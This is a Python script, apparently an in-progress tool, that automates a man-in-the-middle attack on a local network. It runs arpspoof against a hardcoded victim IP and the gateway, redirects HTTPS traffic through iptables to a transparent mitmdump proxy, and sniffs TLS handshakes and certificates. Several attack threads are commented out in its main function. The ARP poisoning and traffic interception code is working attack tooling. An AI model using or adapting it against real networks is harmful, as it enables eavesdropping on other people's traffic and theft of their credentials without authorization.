import os
import sys
import subprocess as sp
import shlex
import time
import re

import multiprocessing as mp
import threading
import logging

import tls
# import OpenSSL.crypto
# import pyshark
# import codecs
# from cs_dict import cs_dict
import ip2mac

arp_flag = threading.Event()
mitm_flag = threading.Event()

stream_hdlr = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('[%(name)s][%(levelname)s]: %(message)s')
stream_hdlr.setFormatter(formatter)

arp_logger = logging.getLogger('arp')
arp_logger.setLevel(logging.DEBUG)
arp_logger.addHandler(stream_hdlr)

mitm_logger = logging.getLogger('mitm')
mitm_logger.setLevel(logging.DEBUG)
mitm_logger.addHandler(stream_hdlr)

def arp(target, gateway = None): # In Progress
    arp_logger.debug('Start arp poisoning')

    cmd = f'arpspoof -r -t {target}'
    if gateway != None:
        cmd += f' {gateway}'

    args = shlex.split(cmd)

    arp_p = sp.Popen(args,
                     stdin = sp.DEVNULL,
                     stdout = sp.DEVNULL,
                     stderr = sp.STDOUT
                     )

    arp_flag.wait()
    arp_p.kill()
    arp_p.wait()

    arp_logger.debug('Arp poisoning is ended')

def mitm():
    mitm_logger.debug('Mitm started')
    mitm_flag.clear()
    iptables_config_file = '.tmp.iptables'

    os.system(f'iptables-save -f {iptables_config_file}')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080') 

    mitm_cmd = f"mitmdump -m transparent"
    mitm_args = shlex.split(mitm_cmd)

    mitm_p = sp.Popen(mitm_args, stdout=sp.DEVNULL, stderr=sp.STDOUT)
    mitm_logger.debug('Mitmdump started')

    mitm_flag.wait()

    mitm_p.kill()

    mitm_p.wait()
    os.system('iptables -t nat -F')
    os.system(f'iptables-restore -T nat {iptables_config_file}')

    mitm_logger.debug('Mitm ended')
    
def main():
    gw,nm,iface = ip2mac.get_route()

    ip2mac_t = threading.Thread(
                                target = ip2mac.probes,
                                args = ()
                                )

    arp_t = threading.Thread(
                            target = arp,
                            args = ('192.168.194.15',gw)
                            )

    mitm_t = threading.Thread(
                            target = mitm,
                            args = ()
                            )

    tls_version_ciphersuite_flag = threading.Event()
    tls_version_ciphersuite_t = threading.Thread(
                            target = tls.sniffer,
                            args = (iface, tls_version_ciphersuite_flag, tls.get_version_ciphersuite, 'tls.handshake.type == 2')
                            )

    tls_cert_flag = threading.Event()
    tls_cert_t = threading.Thread(
                            target = tls.sniffer,
                            args = (iface, tls_cert_flag, tls.verify_cert_pkt, 'tls.handshake.certificate')
                            )


    ip2mac_t.start()
    #arp_t.start()
    #tls_version_ciphersuite_t.start()
    #tls_cert_t.start()
    #mitm_t.start()

    time.sleep(3)
    input('Press Enter to stop...\n')
    #tls_version_ciphersuite_flag.set()
    #tls_cert_flag.set()
    ip2mac.ip2mac_flag.set()
    #arp_flag.set()
    #mitm_flag.set()

    #tls_version_ciphersuite_t.join()
    #tls_cert_t.join()
    ip2mac_t.join()
    #arp_t.join()
    #mitm_t.join()


    #print(ip2mac.ip2mac)




if __name__ == '__main__':
    main()
